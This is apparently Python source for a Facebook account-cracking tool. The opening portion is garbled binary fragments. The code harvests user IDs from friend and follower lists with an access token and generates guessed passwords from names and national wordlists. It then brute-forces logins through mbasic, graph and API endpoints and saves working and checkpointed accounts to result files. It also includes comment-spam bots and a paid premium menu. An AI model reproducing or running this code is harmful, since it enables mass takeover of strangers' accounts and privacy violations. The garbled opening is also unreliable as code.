   �. rp  rq  r�   r#  � ID And Password Broken Or Failed)rr  rs  rI   rt  rE  ru  r  ZparrJ   rL   rw  rx  rI  r,   rV   �TooManyRedirectsrS   rO   r\  r�   r|  rQ   r   r   r�   )r�   �pwr�  r�  r�   r�  r�  r�  rP   r�  rG  r�  r�  ri  r�  r�  r�  r�  r�  r   r   r   �dekura_chann[  sn    �&
�	$r�  c           &         s�  dd l }dd l}dd l}dd l}dd l}dd l}dd l}dd l}	dd l}
dd l	� dd l
}ddlm} ddlm} ddlm} ddlm} d}|	�ddg�}|�� }|j�dd	d
|d|dddddd|d ddd�� i }||j|d d|id�jd�}|�dddi�}g d�}|�d�D ]6}|�d�|v �r|�|�d�|�d�i� n�q�q|�| |d �� ||j||�d!� |d"d#�jd�}d$|jv �rNd%�d&d'� |j�� �� D ��}||jd(d)|id*�jd�}� fd+d'�|�d,d-d.i�D �d/d � }ttd0tt |��  � d}|D ]>}|d17 }td2t|� d3 |d d  d4 |d d1  � �q
�ntd5|jv �rj|�d�}|�ddd6i�d }|�ddd7i�d }|�ddd8i�d }||||d9d:|d;�} ||j||d!  | d<�jd�}!d=d'� |!�d>�D �}"d?tt |"�� }#|#d@k�rtdAt! dB t" dC � n ttdD t" tt |"�� � t#t |"��D ]$}$tdAt|$d1 �dE |"|$  � �qBnXdFt|�v �r�|�dGdHdFi��dG�j}%tdAt! dB t$ |% � ntdAt! dB t$ dI � d S )JNr   )�Browser��BeautifulSoup)rW   r   r   r,  r-  r.  r�   r/  r0  r1  r2  r3  r4  r5  r6  r7  r8  r9  r?  rD  rF  rG  rH  rI  rJ  rN   r�   rL  rM  rP  TrQ  rR  rS  c                 S   s   g | ]\}}d ||f �qS rT  r   rU  r   r   r   rX  �  r   zcheck_in.<locals>.<listcomp>rY  rZ  r[  c                    s   g | ]}� � d t|���qS r]  )r_  r   r`  �r^  r   r   rX  �  r   ra  rb  rc  r�   z4This Account Is Associated With The Application : %sr
   re  r@   rf  rg  rh  rK  ri  r?   rj  rk  rl  c                 S   s   g | ]
}|j �qS r   rm  rn  r   r   r   rX  �  r   ro  ra   r  r"  r#  u   This Account Tap Yes ✓zAvailable Facebook Options : r�  rp  rq  r�   r�  )%rI   �bs4r"   r   �
subprocess�getpass�hashlibrr  r&   r^  r�   Z	mechanizer�  r�  Zrequests.exceptionsrW   rs  rt  rE  ru  rJ   rL   rw  rx  rI  r\  ry  rz  r{  rS   rO   r   rQ   r   r�   r|  r�   )&r}  r~  rI   r�  r"   r   r�  r�  r�  rr  r&   r�   r�  rv  rW   r  r�  r�  r�   r�  r�  r�  rP   r�  r�  r�  r�  r�   rG  r�  r�  ri  r�  r�  r�  Zkiar�  r�  r   r�  r   r&  �  s^    8 0"&8

$r&  c                  C   sZ  t dt d t �} zt| d��� }W n. tyT   ttd � t�d� t	�  Y n0 |D ]�}|�
dd�}z,|�d�}|d � }|d � }|d	 � }W n   Y n0 zPtd
 t d t d t }td
 t d t d t }	t�||||	|g�}
W n   Y n0 |
|	k�rtd	7 antd	7 azt|
| d | � W qZ   Y qZY qZ0 qZt	td � d S )Nr!   �File Name   : r,   r�   r�   r?   r_   r   r
   r   �CPr   �OKzDone ..)rN   rO   rP   r.   r   r  rS   r&   r'   rU   r�   r�   r�   r�   r�   rr  rs  �bf�bg)r  r  r'  r(  rR   �idn�bodatr�   ZcpxZokxZggr   r   r   �fake�  s8    





r�  c                  C   s�  t d� tdt d t �} zt| d��� }W n. ty\   ttd � t�	d� t
�  Y n0 ttd t �}|dv r~t�  n ttd	 t d
 t d t d t �}|dv r�d}n |D �]*}|�dd�}z,|�|�}|d � }|d � }|d � }	W n   Y n0 zVt|�dk �rXtt| t d � td| d d�}
|
�|| |	 d � |
��  W n   Y n0 z|�d�}W n   Y n0 zNd|d � �}tt| t d � td| d d�}
|
�|| |	 d � W q�   Y q�Y q�0 q�t
td � d S )Nr�   r!   r�  r,   r�   r�   �Separator Type : r>   z	Save Filez (zdump/??z): ZAnjayr?   r   r
   �	   z   Very Oldr�   �.jsonr�   Z00000Z100000z   Already old zDone..)�cekfilerN   rO   rP   r.   r   r  rS   r&   r'   rU   r�   r�   r�   r�   r�   rQ   r�   r$   rT   )r  r  Zpmm�aswr'  r(  rR   r�  r�  r�   r  Zoldd�oldr   r   r   r�   �  sP    
(



r�   c               
   C   sj  zt �d� t �d� W n$ ty< }  zW Y d } ~ n
d } ~ 0 0 z<tdd��� }t�d| �}t�|j	�}|d }|d }W n^ ty� }  zFt
td t d	 t d
 t d|   �f t�d� t�  W Y d } ~ n
d } ~ 0 0 t �d� t j�d��rt�  t� d�}d}nt� d�}d}t j�d��r:t�  t� d�}d}	nt� d�}d}	t�d�j	}
t�d��� d }t �d� t�  t�  t
td t d t d
 t d | � t
td t d t d
 t d | � t
td t d t d
 t d |
 � t
td t d t d
 t d | � t
td t d t d
 t d | | t � t
td t d t d
 t d |	 | t � t
td t d t d
 t d t t t � t
td t d t d
 t d  t t t � t
td t d! t d
 t d" t d# � t
td t d$ t d
 t d% � t
td t d& t d
 t d' � t
td t d( t d
 t d) � t
td t d* t d
 t d+ � t
td t d, t d
 t d- � t
td t d. t d
 t d/ � t
td t d0 t d
 t d1 � t
td t d2 t d
 t d3 � t
td t d4 t d
 | d5 � t
td t d6 t d
 |	 d7 � t
td t d8 t d
 t d9 t d: t d; t d< � t
td t d= t d
 t d> t d: t d? t d< � t
td t d@ t d
 t dA t d: t dB t d< � t
td t dC t d
 t dD t d: t dE t d< � t�  d S )FNzmkdir Hasilz
mkdir dumpr�   r,   �,https://graph.facebook.com/me/?access_token=r�   r�   r   r   r   r	   r
   r   r+   r�   r   r�   r   r8   zhttps://api.ipify.orgzhttp://ip-api.com/json/�country�
[rd  z Your Name      : z Your ID        : z Your IP        : z Country        : z Premium        : z Administration : z Last Updated   : z You Join Date  : r   z3===================================================u   ⟩⟩r�   z Dump ID From Public/Friend r�   z Dump ID From Followersr�   z Dump ID Form Name Searchr�   z Dump ID Form Masalr�   z Start Crackr�   z Get Target Informationr�   z View Crack Resultsr�   z Settings User Agent�09z Login User Premium�10z Login User Administrasi�11z Vvip Menu rj   zPay And Freer�   �12z Donasi z
Please bro�13z Upgrade User Trial zTrial To PremiumZ00z Logout zREMOVE TOKEN)r   r   r�   r.   r/   rI   rJ   r�   r�   rL   rS   r�   r�   r&   r'   r�   r2   r3   r7   rP   r   r<   r   �get_visitor�upda�durasir$  r%  r�   r�   �choose_menu)r)   r6   �otwr  �namar�   Zstatus_premZteszZstatus_adminZteszzZipr�  r   r   r   r�      sr    
$4





((((0000,$$$$$$$$$$<<<<r�   c                  C   s2  t td t d t d t d �} | dkrZttd t d t d t d � t�  �n�| d	ksj| d
krtt�  �n�| dks�| dkr�t�  �n�| dks�| dkr�t�  �n�| dks�| dkr�t�  �nl| dks�| dk�r�t	�
d�}|D ]t}d| }z"t|d��� }dtt|�� }W n   d}Y n0 ttd t | t d t d t d t | � q�t dt d t �}zt|d��� }W n0 t�y�   ttd � t�d� t�  Y n0 t|� �nr| d k�s�| d!k�r�t�  �nT| d"k�s�| d#k�r�t�  �n6| d$k�s| d%k�r t	�d&� t�  �n| d'k�s4| d(k�r<t�  n�| d)k�sP| d)k�rXt�  n�| d*k�rpt�  t�  n�| d+k�r�t td, t d- t! d. t d/ � t td0 � t�d1� t	�d2� t�d1� t�  n^| d3k�r�t"�  nL| d4k�r�t#�  n:| d5k�rt$�  t t%d6 � nttd7 � t�d8�t� f d S )9Nr�  r   r   �
 Choose : r?   r   r   � Fill In The Correctr�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r,   ra   � ?? �The File Name You Dump : �    ⟨�IDZ�   ⟩ r!   r�  r�   r�   r�   r�   r�   r�   r�   r�   �rm -rf ua_me.txt�9r�  r�  r�  r�  zJust use it, don't donate rj   zGuna Doang Engga Donasir�   z5You Will Be Redirected To Github Author ( READMD.md )g      �?zCxdg-open https://github.com/Dumai-991/Dumai-991/blob/main/README.mdr�  r�  rW  �Press Enter !!�Please Fill Correctly !!rd   )&rN   r�   r�   rS   r�   �public�follow�dumpsc�
dump_masalr   r�   r.   r   r   rQ   rO   r�   r�   r�   rP   r  r&   r'   rU   �
pilihcrack�get_info�ressr   �menu_user_agentr7   r<   r�   r*   r�   �chatmer�  �buatkeyr�   )r,   r  r�   r�   �juma�total�dumair  r   r   r   r�  ^  sv    $$





6






$





r�  c               �   C   s"  t td � t t� dt� dt� dt� dt� dt� dt� dt� d	t� dt� dt� dt� dt� dt� d
t� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� d t� dt� d!t� dt� d"t� dt� dt� dt� dt� dt� d#t� d$t� dt� d t� dt� d%t� dt� d&t� dt� d't	� ��� t t
d( t d) t
 d* t
 d+ � t t
d( t d, t
 d* t
 d- � t t
d( t d. t
 d* t
 d/ t
 d t d0 t
 d1 � t t
d( t d2 t
 d* t
 d3 � t t
d( t d4 t
 d* t
 d5 � t t
d( t d6 t
 d* t
 d7 t
 d t d8 t
 d1 � t t
d( t d9 t
 d* t
 d: t
 d t d0 t
 d � ttd; t �} ttd< t �}| d=v �r$ttd> � t�  |d=v �rBttd> � t�  n�|d?v �rRd@}nr|dAv �rbdB}nb|dCv �rrdD}nR|dEv �r�dF}nB|dGv �r�dH}n2|dIv �r�dJ}n"|dKv �r�dL}nttd> � t�  ttdM � t tdN t dO |  dP | dQ � t�dR|  dP | dQ � t�dS� t�  d S )TNz<Beforle continuing, please select the active trial period ! rf   rg   rh   ri   rj   rk   rl   rm   rn   ro   rp   rq   rr   rs   rt   ru   rv   rw   rx   ry   rz   r{   r|   r}   r~   r   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   z Bot SharePosts in Profile r�   r   r�   r   z Premium 1 Minggur�   z Premium 1 Bulanr�   z  Premium 2 Bulan + Bot Facebook r�  r�   r�   z Admin 1 Minggur�   z Admin 1 Bulan r�   z Admin 3 Bulan + Bot Facebook zfollow,like,share postr�   z) Premium + Admin 2 Minggu + Bot Facebook zEnter Your Name (Nickname) : z#Please Select User Purchase Menu : r>   r�  )r�   r�   zPremium+Yang+1+Minggu)r�   r�   zPremium+Yang+1+Bulan)r�   r�   u"   Premium+Yang+2+Bulan+±+Bot+Follow)r�   r�   zAdmin+Yang+1+Minggu)r�   r�   zAdmin+Yang+1+Bulanr�   u+   Admin+Yang+3+Bulan+±+Bot+Follow,Like,Sharer�   u   Admin+±+Premium+2+Mingguz- You Will Be Redirected To WhatsApp Author !!zLink Whatsapp : z:https://wa.me/+6283143565470?text=Hallo+Kak...+Nama+Saya+*z*%0A%0ASaya+Mau+Beli+User+*z*+Harap+DiProses+Iya+Kak+zCxdg-open https://wa.me/+6283143565470?text=Hallo+Kak...+Nama+Saya+*�   )rS   rO   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   rN   r�   r*   r�  r   r   r&   r'   r�   )r�  ZuseraZuserxr   r   r   r�  �  sb   ����������������������	�	�	�
�
�
���������������������������������������$$<$$<<








$
r�  c                     s�   dd l � dd l�ttd t �} | dv r:ttd � t�  � �fdd�}tt|d� t d t |  � tt|d� t d t |  � tt|d� t d t |  � d S )	Nr   zEnter Expiry Date : r>   zDon't be empty dearc                    s   d� � �fdd�t| �D ��S )Nr?   c                 3   s   | ]}� � �j�V  qd S r   )rs  Zascii_letters)rV  �x�rr  �stringr   r   �	<genexpr>�  r   z/buatkey.<locals>.random_char.<locals>.<genexpr>)ry  r|  )Zkgr�  r   r   �random_char�  s    zbuatkey.<locals>.random_char�(   r_   )	rr  r�  rN   r�   r�   rS   rO   r�  r�   )Zexpir�  r   r�  r   r�  �  s      r�  c                  C   s�   t dt d t d t d t d � t td t d t d t d � t td t d t d t d	 � tdt d
 t �} | dv r�t td �t�d�f t�  nL| dv r�t	�  n<| dv r�t
�  n,| dv r�t�  nt td �t�d�f t�  d S )Nr!   r   r�   r   z Bot Komen Post Targetr�   z Bot Komen Post Grup Targetr�   z Check My Group IdzPilih Menu : r>   zFill it Correctlyr
   r�   r�   r�   )rS   r�   r�   rN   rO   r�   r&   r'   r�   �bot_komen_post�
grup_komen�grupsaya)Zajgr   r   r   r�   �  s    ($$r�   c            	      C   s�  g } t �d� ztdd��� }W n4 tyT   td� t �d� t�d� t�  Y n0 t �d� t	�  tt
d t d	 t d
 � ttd t �}ttd t �}ttd t �}|�d	d�}�z t�d| d | d | �}t�|j�}tt
t d � |d d D ]r}|d }| �|� t�d| d | d | � tt
t d t d t |d d� �dd� d t d � �qtt
t d � tdt
 d tt| �� � tdt
 d  � t�  W n6 t�y�   tt
d! � tdt
 d" � t�  Y n0 d S )#N�resetr�   r,   z[1;91m[!] Token not found�rm -rf login.txtr
   r   �Use Words *�@�* For New Lines�ID Target : �
Comment : �Limit : r!   r�   �?fields=feed.limit(�)&access_token=�*==========================================�feedr�   r�   �/comments?message=�&access_token=�Done r   �   r@   �... r   ��Done... �Back..zID Failed...�Back...)r   r   r.   r/   r0   rS   r&   r'   r�   r    r�   r�   r�   rN   rO   r�   rI   rJ   r�   r�   rL   r�   rI  r   rQ   r�   rY   )	Zkomenr6   �ide�kmr�   r�   r  �s�fr   r   r   r�    sB    




@
r�  c                  C   sv  g } t �d� ztdd��� }W n8 tyX   ttd � t �d� t�d� t	�  Y n0 t �d� t
�  ttd t d t d	 � ttd
 t �}ttd t �}ttd t �}|�dd�}z>t�d| d | �}t�|j�}ttd t |d  � W n6 t�y6   ttd � tdt d � t�  Y n0 �z t�d| d | d | �}t�|j�}ttt d � |d d D ]r}	|	d }
| �|
� t�d|
 d | d | � ttt d t d t |d d� �dd � d! t d" � �q�ttt d � td#t d$ tt| �� � tdt d% � t�  W n6 t�yp   ttd& � tdt d � t�  Y n0 d S )'Nr�  r�   r,   �Token not foundr�  r
   r�  r�  r�  r�  r�  r�  r!   z%https://graph.facebook.com/group/?id=r�  zName Grup : r�   zGroup ID Not Foundr�  z https://graph.facebook.com/v3.0/r�  r�  r�  r�  r�   r�   r�   r�  r�  r   �   r@   r�  r   r�  r�  r�  zProblem Not Found...)r   r   r.   r/   r0   rS   rO   r&   r'   r�   r    r�   r�   r�   rN   r�   rI   rJ   r�   r�   rL   rY   r�   r�   rI  r   rQ   )Z	komengrupr6   r�  r�  r�   r,   r�  r�   r  r�  r�  r   r   r   r�  &  sR    




@
r�  c               	   C   sP  g } t �d� ztdd��� }W n8 tyX   ttd � t �d� t�d� t	�  Y n0 zt �
d� W n tyz   Y n0 t �d� t�  z�t�d| �}t�|j�}|d	 D ]p}|d
 }|d }tdd�}| �|| � |�|d | d � ttd t t|� t d t t|� t� q�|��  ttt d � ttd t dt| �  � ttd t d � tdt d � t�  W n� ttf�y�   tdt d � t�  Y n� t �y�   t �!d� ttd � tdt d � t�  Y n^ tj"j#�y   ttd � t$�  Y n6 t�yJ   ttd � tdt d � t�  Y n0 d S )Nr�  r�   r,   r�  r�  r
   r�   z2https://graph.facebook.com/me/groups?access_token=r�   r�   r�   zdump/GrupCheck.txtrF   r@   r!   zNama Grup : z   ID Grup : r�  zGroup Total : ra   zList Save : r�  z
Stop !!...zGroup not foundzNo Connection�Error)%r   r   r.   r/   r0   rS   r�   r&   r'   r�   �mkdir�OSErrorr    rI   rJ   r�   r�   rL   r�   r$   rO   r�   r   r�   �m3r�   rT   rQ   rN   r�   rX   �EOFErrorrY   �removerV   rW   rU   )Zlistgrupr6   ZuhZgudr�   r�  r�   r�  r   r   r   r�  P  s\    




0




r�  c               	   C   s�  zt dd��� aW n( ty:   t�d� ttd � Y n0 g } tdt	 d t
 d t	 d t
 d	 � tt	d t
 d
 t	 d t
 d � tt	d t
 d t	 d t
 d � tdt d t �}|dv r�ttd � t�d� t�  nj|dv �r| �d� d} nP|dv �r| �d� d} n6|dv �r8| �d� d} nttd � t�d� t�  zNtttd t ��}ttd t �}ttd t �}|}t d| d d�}W n   d}Y n0 tdt d � t|�D �]�}|d7 }ttd |  �}| d!v �r�zxt d| d d"�}	t�d#|tf ��� d$ D ]>}
|
d% }|
d& }t�|d' | � |	�|d' | d � �q"|	��  W n  t�y�   ttd( � Y n0 �q�| d)v �rFz�t d| d d"�}	t�d*| d+ | d, t ��� d$ D ]>}
|
d% }|
d& }t�|d' | � |	�|d' | d � �q�|	��  W n  t�y@   ttd( � Y n0 �q�| d-v �r�z�t d| d d"�}	t�d*| d+ | d, t ��� d$ D ]>}
|
d% }|
d& }t�|d' | � |	�|d' | d � �q�|	��  W n  t�y�   ttd( � Y n0 z�t d| d d"�}	t�d*| d. | d, t ��� d$ D ]>}
|
d% }|
d& }t�|d' | � |	�|d' | d � �q0|	��  W n  t�y�   ttd( � Y n0 �q�ttd/tt�  � ttd0 t d | d � ttd1 � t�  d S )2Nr�   r,   r�  zToken Failed !!r!   r   r�   r   zDump Publicr�   zDump Followr�   zDump Public + FollowzSelect Menu Dump : r>   zDon`t Empty !!r
   r�   r�  r�   r�  r�   �allzPlease Fill Correctly ! zNumber of Targets (5) : r�   r�  r�   r�  rF   z*Fill in 'me' if you want from friends listzTarget ID %s : )r�  r�   �5https://graph.facebook.com/%s/friends?access_token=%sr�   r�   r�   r�   z+Sorry It Seems This Idz Is Not Published !!)r�  r�   �/friends?limit=r�  )r�  �/subscribers?limit=zTotal ID : %s�Dump Results Saved In : zEnter !!)r.   r/   r�   r0   r   r   rU   rO   rS   r�   r�   rN   r�   r�   r*   r&   r'   r�  r�   r  r|  rI   rJ   r�   r�   r$   rT   rY   rQ   r�   )�mainZdump_apaZtanya_totalr�   r�   �limtzr   �tr�   r�   rP   r�   r�  r   r   r   r�  �  s�    
($$









*
**r�  c                  C   s�  z t dd��� } t dd��� }W nF tyf   ttd t d t d t d � t�d� t�  Y n0 g }�z�tdt	 d	 � tt	d
 � t
td t �}|dv r�tt	d � t�d� t�  t
dt d t �}|dv r�d}n t
td t �}|dv �rd}n tt	d � t�d� zFt�d| d | �}t�|j�}t�|j�}ttd |d  � W n  t�y~   tt	d � Y n0 t�d| d | d | �}	z�t d| d d�}
t�|	j�}|d D ]>}|d  }|d }|�|d! | � |
�|d! | d � �q�|
��  td"t	 d#ttt|��f  d$d%� tj��  W n t�yR   Y n0 W n t�yj   Y n0 td"t	 d&ttt|��f  d$d%� tj��  tdt	 d' t d | d � t
t	d( � t �  d S ))Nr�   r,   r�  r   r   � Cookie/Token Invalidr�  r!   z.Fill In 'me' If You Want From Your Own Publics�Press Enter To Skip..zID Public : r>   �Don't Empty!!r
   r�   rk   zLimit Dump Idz : �5000�Wait a moment Checking ID !!r�   r�   r   �Name : r�   �!Sorry Idz Target Not Published !!r�  r�  r�   r�  rF   r�   r�   r�   �
zTotal ID : %s%sr@   r�   zTotal ALL ID: %s%sr  zPress enter !!



)!r.   r/   r0   rS   r�   r�   r   r   r�   rO   rN   r�   r�   r&   r'   r�  r�   rI   rJ   r�   r�   rL   rY   r*   r�   r$   rT   r   rQ   r"   r#   r%   r�   )r6   r�   r�   r�   r�   r  �pok�spr*  r,   r�   r(   rP   r�   r�   r   r   r   r�  �  sd    $


2
. r�  c                  C   s�  z t dd��� } t dd��� }W nF tyf   ttd t d t d t d � t�d� t�  Y n0 g }�z�tdt	 d	 � tt	d
 � t
td t �}|dv r�tt	d � t�d� t�  t
dt d t �}|dv r�d}n t
t	d t �}|dk�s|dk�r
d}tt	d � t�d� zFt�d| d | �}t�|j�}t�|j�}ttd |d  � W n  t�y�   tt	d � Y n0 t�d| d | d | �}	z�t d| d d �}
t�|	j�}|d! D ]>}|d" }|d }|�|d# | � |
�|d# | d � �q�|
��  td$t	 d%ttt|��f  dd&� tj��  W n t�yZ   Y n0 W n t�yr   Y n0 td't	 d(ttt|��f  dd&� tj��  tdt	 d) t d | d � t
t	d* � t �  d S )+Nr�   r,   r�  r   r   r  r�  r!   z0Fill In 'me' If You Want From Your Own Followersr  zID Follow 01 : r>   r  r
   r�   rk   zLimit (1500) : r?   r@   r  r	  r�   r�   r   r
  r�   r  r   r�  r�   r�  rF   r�   r�   r�   r�  zTotal Id : %s%sr�   r  zTotal ALL ID : %s%sr  zPress enter !!


)!r.   r/   r0   rS   r�   r�   r   r   r�   rO   rN   r�   r�   r&   r'   r�  r�   rI   rJ   r�   r�   rL   rY   r*   r�   r$   rT   r   rQ   r"   r#   r%   r�   )r6   r�   r�   r�   r�   r�   r  r  r*  r,   r�   r(   rP   r�   r�   r   r   r   r�    sd    $

2
. r�  c                 C   sz  t td t d t d t d t d t d t d � t td t d	 t d t d
 t d t d t d t d � t td t d t d t d t d t d t d � t td t d t d t d t d t d t d � t td t d t d t d t d t d t d � t td t d t d t d t d t d t d � ttd t d t d t d �}|dv �r�t td t d t d t d � t| � n�|dv �r�t| � n�|dv �r�t| ��	| � n||dv �rt
| � nh|dv �r"t| � nT|dv �r6t| � n@|d v �rJt| � n,t td t d t d t d � t| � d S )!Nr�  r�   r   z Api V1 rj   z FAST CRACK r�   r   r�   z Api V2 z
 Recommendr�   z Mbasic + Opsi Sensi z SLOW CRACK r�   z Mbasic + 4 User Agent Tap Yes r�   z Free Facebook z VERY SLOW r�   z Graph Facebook r   r�  )r?   r   r�  r�   r�   r�   r�   r�   r�   )rS   r�   r�   rP   r�   rN   r�  �bapi�	crackmenu�passmenu�crack�crack2�crackffb�grap)r�   �krahr   r   r   r�  K  s0    <D<<<<$
$











$r�  c                 C   s&  g }t dd��� }| �d�D �]}t|�dk r2qq|�� }| �� }t|�dksft|�dksft|�dkr�|�|d � |�|d � |�|d	 � q|�|� |�|� d
|v r�|�d� |�d� |�d� qd|v �r|�d� |�d� |�d� |�d� qd|v �r,|�d� |�d� |�d� qd|v �r`|�d� |�d� |�d� |�d� qd|v �r�|�d� |�d� |�d� |�d� |�d� |�d� |�d� |�d � |�d� |�d!� |�d"� |�d#� qd$|v r|�d� |�d!� |�d"� |�d#� |�d� qq|S )%N�	.pass.txtr,   r@   rC   r�  r�   �123�1234�12345r�   ZsayangZanjingr(  �bdZ786786Z000786Z102030Z556677�pkZpakistan�usZ123456ZqwertyZiloveyou�	passwordsr�  ZsayangkuZ	bismillahZ	indonesiaZbajinganZbangsatZ	katasandiZ1234567Z12345678Z	123456789r�  )r.   r/   r�   rQ   �lowerr�   )rL   �resultsZctrP   r�   r   r   r   �generatee  sh    $






























r!  c                  C   s�  t td �t�d�f t dt d t d t d t d � t td t d t d t d	 � t td t d
 t d t d � t td t d t d t d � t td t d t d t d � t td t d t d t d � t td t d t d t d � tdt d t �} | dv �rTt td �t�d�f t	�  �n6| dv �r~t
dd�}|�d� |��  �n| dv �r�t
dd�}|�d� |��  n�| dv �r�t
dd�}|�d� |��  n�| d v �r�t
dd�}|�d!� |��  n�| d"v �rt
dd�}|�d#� |��  nl| d$v �rFt
dd�}|�d%� |��  nD| d&v �rnt
dd�}|�d'� |��  nt td �t�d�f t	�  d S )(NzPlease Choose Password..r�   r!   r   r�   r   z name123,name1234,name12345r�   z India/Bangladeshr�   z	 Pakistanr�   z United Statesr�   z
 Indonesiar�   z Old Passwordsr�   z All Passwords From IndonesiazLanguage : r>   zPlease Fill Correctlyr
   r�   r  rF   Znoner�   r  r�   r  r�   r  r�   r�   r�   r�  r�   r�  )rS   rO   r&   r'   r�   r�   rN   r�   r�   �pilih_pwr.   r$   rT   )Znjjr  r   r   r   r"  �  sT    ($$$$$$




























r"  c           
      C   s�  t �� }|j�dddddddd�� |�d	�}t�|jd
�}d�tj	�
d|j��}i }|d�D ]~}|�d�d u r�|�d�dkr�|�d| i� q�|�d�dkr�|�d|i� q�|�|�d�di� q^|�|�d�|�d�i� q^|�|dddddddd�� |j�ddi� |jd|d�j}	dt|j�� �� �v �rFd| ||j�� d�S dt|j�� �� �v �rrd| ||j�� d�S d| |d�S d S ) Nr-  r.  r�   z�Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]�Utext/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8r7  r8  �r:  r;  r<  r?  r@  rB  rC  �https://mbasic.facebook.com/rF  r?   �dtsg":\{"token":"(.*?)"rN   rL  r�   rN  rO  r  �d�rh  Zm_sessZ__userZ__reqZ__csrZ__aZ__dynZencpassrA  �:https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8�~https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100rl  rR  �success��statusrN  rO  r\  rg  �cp�error�r-  rN  rO  )rI   rt  rE  ru  rJ   r�  r�  rL   ry  r^  r_  rI  r�  r\  rz  �keys)
�em�pas�hostsr,   r�   �b�metar�   rP   �por   r   r   �mbasic�  s4    

��r8  �m.facebook.comr.  r�   r#  r7  r8  r$  c           
      C   sj  t �� }|j�t� |�d�}t�|jd�}d�	tj
�d|j��}i }|d�D ]~}|�d�d u r�|�d�dkr~|�d| i� q�|�d�d	kr�|�d	|i� q�|�|�d�di� qN|�|�d�|�d�i� qN|�|dd
dddddd�� |j�ddi� |jd|d�j}	d|j�� �� v �r2d| ||j�� d�S d|j�� �� v �rZd| ||j�� d�S d| |d�S d S )Nr�   rF  r?   r&  rN   rL  r�   rN  rO  r  r'  r(  rA  z9https://graph.facebook.com/login/?next&ref=dbl&fl&refid=8z}https://graph.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100rl  rR  r+  r,  rg  r.  r/  r0  )rI   rt  rE  ru  �graph_hrJ   r�  r�  rL   ry  r^  r_  rI  r\  rz  r1  )
r2  r3  r4  r,   r�   r5  Zdtgr�   rP   r7  r   r   r   �graph�  s4    

��r;  c                 C   s�  t �g d��}t�� }|j�ddd|dddd�� |�d	�}t�|j	d
�}d�
tj�d|j	��}i }|d�D ]~}	|	�d�d u r�|	�d�dkr�|�d| i� q�|	�d�dkr�|�d|i� q�|�|	�d�di� ql|�|	�d�|	�d�i� ql|�|dddddddd�� |j�ddi� |jd|d�j	}
dt|j�� �� �v �rTd| ||j�� d�S dt|j�� �� �v �r�d| ||j�� d�S d| |d�S d S ) N)r   zyMozilla/5.0 (Series40; NokiaC2-03/07.48; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31zlMozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36z�Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.159 CoRom/33.0.1750.159 Safari/537.36 Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54r-  r.  r�   r#  r7  r8  r$  r%  rF  r?   r&  rN   rL  r�   rN  rO  r  r'  r(  rA  r)  r*  rl  rR  r+  r,  rg  r.  r/  r0  )rr  rs  rI   rt  rE  ru  rJ   r�  r�  rL   ry  r^  r_  rI  r�  r\  rz  r1  )r2  r3  r4  Zua_duar,   r�   r5  r6  r�   rP   r7  r   r   r   �mbasic2  s6    

��r<  c                   @   s,   e Zd Zdd� Zdd� Zdd� Zdd� Zd	S )
r  c                 C   s
   g | _ d S r   )r�   ��self�isifiler   r   r   �__init__%  s    zcrackmenu.__init__c                    s�  z|� _ t� j ��� �� � _W n(   ttd � t�d� t	�  Y n0 tdt d t
 d t d t d t d t
 d	 � ttd
 �}|dv �rtdt d �}tdtt|f � |dkr�ttd � q�t|�dkr�ttd � q�d!� fdd�	}||�d�� �q�q�n�|dv �r�tdt d t d t d t d t d t
 d t d � ttd t t t d t
 t � td� � ��  n ttd  � t�d� t� ��  d S )"NzFile Not Found! Try Againr�   r	  z$Do you want to use manual password? r   �yr�   �nr   zChoose An Option : �rA  �Yr!   zEnter Manual Password : z%sThe Password You Use : %s%sr?   zPlease Enter Password !!r�   zPassword Minimum 6 Letters !!c                    s�   t dd��L}� jD ]4}z"|�d�d }|�� j|| � W q   Y q0 qW d   � n1 s\0    Y  t�� j� tt	t
� d S )Nr�  r�   r�   r   )�zthreadsr�   r�   r�   �apir   r�  �apkr   �okr.  )ZzscrG  r�   Zuserid�r>  r   r   �zkth:  s    
,z crackmenu.passmenu.<locals>.zkth�,�rB  �Nz7Turn On Airplane Mode, For 5 Seconds, Then Turn It Off
zOk Crack Results Saved In : �	Hasil/OK-�.txt
zCp Crack Results Stored In : �	Hasil/CP-z.txt

zCrack Start Hours : re  zWrong Input! Try Again)N)rG  r.   r/   r�   r�   rS   rO   r&   r'   r�   r�   r�   r�   r�   rN   r�   r*   rQ   r�   r�  r�   �jamzr  r  r  )r>  r?  ZzkZpwxrJ  r   rI  r   r  '  s8    
8
	
@$


zcrackmenu.passmenuc                 C   s�  |D �]�}|� � }zt�d� W n   Y n0 tj�dt|ttt	| j
�t	t�t	t�f �f tj��  ztdd��� }W n  ty�   t�ddg�}Y n0 tt�dd��tt�d	d
��tt�d	d
��dd|ddd�}d}ddd|d|dddd�	}tj|||d�}d|jv �rnd|jv �rntdtttt||tf � d||f }	t�|	� tdt d d ��d!|	 �  �q�qqd"|�� d# v rz�td$��� }
td$��� }t�d%||
